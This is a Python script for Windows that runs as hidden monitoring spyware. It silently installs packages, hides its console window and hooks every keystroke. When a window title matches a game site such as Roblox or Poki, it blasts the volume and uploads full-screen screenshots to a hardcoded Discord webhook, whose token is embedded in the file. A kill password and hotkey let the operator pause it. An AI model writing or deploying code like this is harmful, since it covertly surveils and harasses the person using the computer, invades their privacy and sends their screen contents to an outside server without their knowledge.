# script.py - Only contains the original monitoring code (headless, no file creation)
import sys
import os
import time
import threading
import win32gui
import pyautogui
import keyboard
import requests
import io
from datetime import datetime
from PIL import ImageGrab
import json
import subprocess
import importlib.util

# ========== AUTO-INSTALL DEPENDENCIES ==========
def install_package(pkg):
    """Silently install a package"""
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=60
        )
        return True
    except:
        return False

# Check and install required packages
required_packages = ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]
for pkg in required_packages:
    try:
        if pkg == "pillow":
            __import__("PIL.ImageGrab")
        else:
            __import__(pkg)
    except ImportError:
        install_package(pkg)

# ========== HEADLESS MODE ==========
# Hide console window
try:
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, 0)  # SW_HIDE
except:
    pass

# ========== ORIGINAL MONITORING CODE ==========
# ---------------- CONFIG ----------------
TARGET_KEYWORDS = [
    "crazygames",
    "roblox",
    "jeux gratuits",
    "joue maintenant", "poki"
]

SPAM_SPEED = 0.05
STABILITY_TIME = 0.3
PASSWORD = "stop123"
TOGGLE_HOTKEY = "ctrl+alt+p"

# Discord Webhook Configuration
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
SEND_SCREENSHOTS = True
SCREENSHOT_DELAY = 0.5

# ---------------- GLOBALS ----------------
spamming = False
mute_done = False
lock = threading.Lock()
tracking_enabled = True
password_buffer = ""
last_key_time = 0
detected_targets = set()

# ---------------- HELPERS ----------------
def title_matches_target(title: str) -> bool:
    title_lower = title.lower()
    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)

def get_matching_keyword(title: str) -> str:
    title_lower = title.lower()
    for keyword in TARGET_KEYWORDS:
        if keyword in title_lower:
            return keyword
    return ""

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except:
        return None

def send_discord_alert(title, keyword, screenshot=None):
    if not DISCORD_WEBHOOK_URL:
        return False
    
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        embed = {
            "title": "⚠️ Target Detected",
            "description": f"**Window:** `{title}`\n**Keyword:** `{keyword}`\n**Time:** `{current_time}`",
            "color": 16711680,
            "footer": {"text": "Monitor"}
        }
        
        if screenshot and SEND_SCREENSHOTS:
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            
            files = {'file': ('screenshot.png', img_byte_arr, 'image/png')}
            payload = {"embeds": [embed], "content": "📸 Screenshot below:"}
            
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                files=files,
                data={'payload_json': json.dumps(payload)}
            )
        else:
            payload = {"embeds": [embed], "content": f"🚨 Detected: {title}"}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
        
        return response.status_code in [200, 204]
    except:
        return False

def send_discord_status(status):
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = 65280 if status == "ENABLED" else 16711680
        
        embed = {
            "title": f"🔄 Tracking {status}",
            "description": f"Status: **{status}**\nTime: `{current_time}`",
            "color": color,
            "footer": {"text": "Monitor"}
        }
        
        payload = {"embeds": [embed]}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
        
        return response.status_code in [200, 204]
    except:
        return False

def toggle_tracking():
    global tracking_enabled, password_buffer
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    
    send_discord_status(status)
    
    if not tracking_enabled:
        global spamming, mute_done
        with lock:
            if spamming:
                spamming = False
                mute_done = True
                try:
                    pyautogui.press("volumemute")
                except:
                    pass
    
    password_buffer = ""

def on_key_event(e):
    global password_buffer, last_key_time
    
    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
        return
    
    current_time = time.time()
    
    if current_time - last_key_time > 2:
        password_buffer = ""
    
    last_key_time = current_time
    
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'backspace':
            password_buffer = password_buffer[:-1]
        elif e.name == 'space':
            password_buffer += ' '
        elif len(e.name) == 1:
            password_buffer += e.name
        elif e.name == 'enter':
            check_password()
            return
    
    check_password()
    
    if len(password_buffer) > 20:
        password_buffer = password_buffer[-20:]

def check_password():
    global password_buffer
    if PASSWORD in password_buffer:
        toggle_tracking()
        password_buffer = ""

def setup_keyboard_listener():
    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
    keyboard.hook(on_key_event, suppress=False)
    return keyboard

def volume_spammer():
    global spamming
    while spamming:
        try:
            pyautogui.press("volumeup")
            time.sleep(SPAM_SPEED)
        except:
            pass

# ---------------- MAIN LOOP ----------------
kb_listener = setup_keyboard_listener()

stable_on = 0.0
stable_off = 0.0

try:
    while True:
        if tracking_enabled:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd).strip()

                if not title:
                    time.sleep(0.05)
                    continue

                detected = title_matches_target(title)

                if detected:
                    stable_on += 0.1
                    stable_off = 0.0
                else:
                    stable_off += 0.1
                    stable_on = 0.0

                if not spamming and stable_on >= STABILITY_TIME:
                    keyword = get_matching_keyword(title)
                    
                    with lock:
                        spamming = True
                        mute_done = False
                    
                    threading.Thread(target=volume_spammer, daemon=True).start()
                    
                    if DISCORD_WEBHOOK_URL:
                        detection_id = f"{title}_{keyword}_{int(time.time())}"
                        
                        if detection_id not in detected_targets:
                            detected_targets.add(detection_id)
                            
                            time.sleep(SCREENSHOT_DELAY)
                            
                            screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                            
                            alert_thread = threading.Thread(
                                target=send_discord_alert,
                                args=(title, keyword, screenshot),
                                daemon=True
                            )
                            alert_thread.start()
                            
                            threading.Timer(300, lambda: detected_targets.discard(detection_id)).start()

                if spamming and stable_off >= STABILITY_TIME:
                    with lock:
                        spamming = False
                        if not mute_done:
                            try:
                                pyautogui.press("volumemute")
                                mute_done = True
                            except:
                                pass

            except Exception:
                pass
        
        time.sleep(0.1)

except KeyboardInterrupt:
    pass
except Exception:
    pass
finally:
    kb_listener.unhook_all()
    if spamming:
        spamming = False
